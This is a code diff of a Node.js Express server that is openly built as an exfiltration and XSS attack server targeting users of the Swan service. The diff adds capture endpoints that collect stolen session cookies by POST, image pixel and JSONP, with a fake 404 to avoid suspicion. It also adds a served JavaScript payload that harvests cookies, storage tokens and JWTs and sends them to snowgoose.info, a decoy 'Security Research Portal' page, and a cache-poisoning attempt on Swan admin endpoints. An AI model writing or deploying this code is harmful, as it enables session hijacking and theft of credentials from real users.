@@ -1,40 +1,328 @@
-// Simple Node.js Express server for snowgoose.info
 const express = require('express');
 const cors = require('cors');
 const fs = require('fs');
+const path = require('path');
+const bodyParser = require('body-parser');
+
+// Create data directory if it doesn't exist
+const dataDir = path.join(__dirname, 'captured_data');
+if (!fs.existsSync(dataDir)) {
+    fs.mkdirSync(dataDir, { recursive: true });
+}
+
 const app = express();
 
-app.use(cors()); // Allow cross-origin requests
-app.use(express.json({limit: '10mb'}));
+// Configure CORS to accept requests from any origin
+app.use(cors({
+    origin: '*',
+    methods: ['GET', 'POST', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization'],
+    credentials: true
+}));
 
-// Endpoint to receive exfiltrated data
-app.post('/swan-capture', (req, res) => {
-    const data = req.body;
-    const timestamp = new Date().toISOString().replace(/:/g, '-');
-    
-    // Save to file with timestamp
-    fs.writeFileSync(`./captured-${timestamp}.json`, JSON.stringify(data, null, 2));
-    console.log('Captured data from:', req.headers['user-agent']);
-    
-    // Return success but make it look like an error page to avoid suspicion
-    res.status(200).send('Not found');
-});
+// Support various content types and larger payloads
+app.use(bodyParser.json({ limit: '20mb' }));
+app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
+app.use(bodyParser.text({ limit: '20mb' }));
 
-// Image-based exfiltration endpoint
-app.get('/swan-capture/img', (req, res) => {
-    const data = req.query.data;
-    if (data) {
-        const timestamp = new Date().toISOString().replace(/:/g, '-');
-        fs.writeFileSync(`./img-captured-${timestamp}.txt`, data);
-        console.log('Captured data via image from:', req.headers['user-agent']);
+// Parse cookies helper function
+function parseCookies(cookieString) {
+    if (!cookieString) return {};
+    
+    return cookieString.split(';')
+        .map(cookie => cookie.trim())
+        .reduce((cookies, cookie) => {
+            const [key, value] = cookie.split('=').map(part => part.trim());
+            if (key && value) {
+                try {
+                    cookies[key] = decodeURIComponent(value);
+                } catch (e) {
+                    cookies[key] = value;
+                }
+            }
+            return cookies;
+        }, {});
+}
+
+// Save captured data to file with useful metadata
+function saveCapture(data, source, req) {
+    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+    const filename = path.join(dataDir, `${source}-${timestamp}.json`);
+    
+    // Add metadata to the saved data
+    const enrichedData = {
+        captureTime: new Date().toISOString(),
+        source: source,
+        clientInfo: {
+            ip: req.ip || req.connection.remoteAddress,
+            userAgent: req.headers['user-agent'],
+            referer: req.headers['referer'],
+            origin: req.headers['origin']
+        },
+        data: data
+    };
+    
+    fs.writeFileSync(filename, JSON.stringify(enrichedData, null, 2));
+    console.log(`[${new Date().toLocaleTimeString()}] Captured ${source} data from ${req.headers['user-agent']}`);
+    
+    // Look for Swan cookies specifically
+    if (data.cookies || data.rawCookies) {
+        const cookies = data.cookies || data.rawCookies;
+        if (typeof cookies === 'string' && cookies.includes('swan_session_id')) {
+            console.log(`[${new Date().toLocaleTimeString()}] 🔐 FOUND SWAN SESSION COOKIE!`);
+            
+            try {
+                const parsedCookies = parseCookies(cookies);
+                if (parsedCookies.swan_session_id) {
+                    console.log(`[${new Date().toLocaleTimeString()}] 🔑 Swan session ID captured successfully`);
+                    
+                    // Create a special file for the valuable session ID
+                    const sessionFile = path.join(dataDir, `swan_session-${timestamp}.txt`);
+                    fs.writeFileSync(sessionFile, parsedCookies.swan_session_id);
+                }
+            } catch (e) {
+                console.error('Error parsing cookies:', e);
+            }
+        }
     }
     
-    // Return a tiny transparent pixel
-    const pixel = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');
-    res.setHeader('Content-Type', 'image/gif');
-    res.send(pixel);
+    return filename;
+}
+
+// Main data exfiltration endpoint
+app.post('/swan-capture', (req, res) => {
+    try {
+        // Handle different types of data
+        let data;
+        if (typeof req.body === 'string') {
+            try {
+                data = JSON.parse(req.body);
+            } catch (e) {
+                data = { rawData: req.body };
+            }
+        } else {
+            data = req.body;
+        }
+        
+        // If we received cookies, parse them
+        if (data.cookies && typeof data.cookies === 'string') {
+            data.parsedCookies = parseCookies(data.cookies);
+        }
+        
+        saveCapture(data, 'direct', req);
+        
+        // Return 404 to avoid suspicion
+        res.status(404).send('Not Found');
+    } catch (error) {
+        console.error('Error handling capture:', error);
+        res.status(500).send('Server Error');
+    }
 });
 
-app.listen(3000, () => {
-    console.log('Exfiltration server running on port 3000');
+// Image-based exfiltration
+app.get('/swan-capture/img', (req, res) => {
+    try {
+        if (req.query.data) {
+            let decodedData;
+            try {
+                decodedData = decodeURIComponent(req.query.data);
+            } catch (e) {
+                decodedData = req.query.data;
+            }
+            
+            const data = {
+                rawCookies: decodedData,
+                parsedCookies: parseCookies(decodedData)
+            };
+            
+            saveCapture(data, 'image', req);
+        }
+        
+        // Return a transparent 1x1 pixel
+        const pixel = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');
+        res.setHeader('Content-Type', 'image/gif');
+        res.send(pixel);
+    } catch (error) {
+        console.error('Error handling image capture:', error);
+        
+        // Still return an image even on error
+        const pixel = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');
+        res.setHeader('Content-Type', 'image/gif');
+        res.send(pixel);
+    }
+});
+
+// JSONP exfiltration for environments where XHR might be blocked
+app.get('/swan-capture/jsonp', (req, res) => {
+    try {
+        const callback = req.query.callback || 'callback';
+        let data = req.query.data || '';
+        
+        if (data) {
+            try {
+                data = decodeURIComponent(data);
+                saveCapture({ rawData: data }, 'jsonp', req);
+            } catch (e) {
+                console.error('Error with JSONP data:', e);
+            }
+        }
+        
+        // Return a JSONP response
+        res.setHeader('Content-Type', 'application/javascript');
+        res.send(`${callback}({"status":"ok"})`);
+    } catch (error) {
+        console.error('Error handling JSONP capture:', error);
+        res.status(500).send('Server Error');
+    }
+});
+
+// Special endpoint for XSS payload delivery
+app.get('/xss.js', (req, res) => {
+    // Record information about who's loading the XSS payload
+    saveCapture({ 
+        event: 'xss_payload_loaded',
+        cookies: req.headers.cookie
+    }, 'xss_load', req);
+    
+    // Return a JavaScript payload that exfiltrates data
+    const payload = `
+    (function() {
+        try {
+            // Collect all cookies
+            const cookies = document.cookie;
+            
+            // Try to find specific Swan cookies in localStorage or sessionStorage
+            let storage = {};
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    if (key.includes('swan') || key.includes('token') || key.includes('auth')) {
+                        storage['localStorage_' + key] = localStorage.getItem(key);
+                    }
+                }
+                
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    if (key.includes('swan') || key.includes('token') || key.includes('auth')) {
+                        storage['sessionStorage_' + key] = sessionStorage.getItem(key);
+                    }
+                }
+            } catch(e) {
+                storage.error = e.message;
+            }
+            
+            // Find any JWT tokens in the DOM (sometimes found in data attributes)
+            let jwtTokens = [];
+            const jwt_regex = /eyJ[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}\\.[a-zA-Z0-9_-]{5,}/g;
+            const htmlContent = document.documentElement.outerHTML;
+            const matches = htmlContent.match(jwt_regex);
+            if (matches) {
+                jwtTokens = matches;
+            }
+            
+            // Exfiltrate using image method (works even in restrictive environments)
+            const img = new Image();
+            img.src = 'https://snowgoose.info/swan-capture/img?data=' + encodeURIComponent(cookies);
+            document.body.appendChild(img);
+            
+            // Try XHR method as fallback
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://snowgoose.info/swan-capture', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({
+                    cookies: cookies,
+                    storage: storage,
+                    url: window.location.href,
+                    jwtTokens: jwtTokens,
+                    timestamp: new Date().toISOString()
+                }));
+            } catch(e) {
+                // Fallback to JSONP if XHR fails
+                const script = document.createElement('script');
+                script.src = 'https://snowgoose.info/swan-capture/jsonp?callback=c&data=' + 
+                    encodeURIComponent(JSON.stringify({cookies:cookies, error:e.message}));
+                document.body.appendChild(script);
+            }
+        } catch(e) {
+            console.error('Exfiltration error:', e);
+        }
+    })();
+    `;
+    
+    res.setHeader('Content-Type', 'application/javascript');
+    res.send(payload);
+});
+
+// Serve the main exploit page
+app.get('/', (req, res) => {
+    const html = `
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Security Research Portal</title>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <style>
+            body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
+            h1 { color: #333; }
+        </style>
+    </head>
+    <body>
+        <h1>Security Research Portal</h1>
+        <p>This page is analyzing browser security settings...</p>
+        
+        <!-- Load the exfiltration script -->
+        <script src="/xss.js"></script>
+        
+        <!-- Cache poisoning attempt -->
+        <script>
+            // Try to poison browser cache for Swan endpoints
+            if ('caches' in window) {
+                caches.open('swan-api-cache').then(cache => {
+                    // Try to add redirecting responses to the cache
+                    const swanEndpoints = [
+                        'https://api.swan.io/admin-auth/graphql',
+                        'https://api.swan.io/admin/graphql'
+                    ];
+                    
+                    swanEndpoints.forEach(endpoint => {
+                        // Create a request object for each endpoint
+                        const request = new Request(endpoint);
+                        
+                        // Create a response that contains our exfiltration code
+                        const response = new Response(
+                            'alert("Cache has been poisoned");',
+                            {
+                                headers: {
+                                    'Content-Type': 'application/javascript',
+                                    'X-Poisoned': 'true'
+                                }
+                            }
+                        );
+                        
+                        // Add to cache
+                        cache.put(request, response).then(() => {
+                            console.log('Cache poisoned for:', endpoint);
+                        }).catch(err => {
+                            console.error('Cache poisoning failed:', err);
+                        });
+                    });
+                });
+            }
+        </script>
+    </body>
+    </html>
+    `;
+    
+    res.setHeader('Content-Type', 'text/html');
+    res.send(html);
+});
+
+// Listen on port 3000
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`[${new Date().toLocaleTimeString()}] ✅ Exfiltration server running on port ${PORT}`);
+    console.log(`[${new Date().toLocaleTimeString()}] 📁 Saving captured data to: ${dataDir}`);
+    console.log(`[${new Date().toLocaleTimeString()}] 🕵️ Waiting for victims...`);
 });
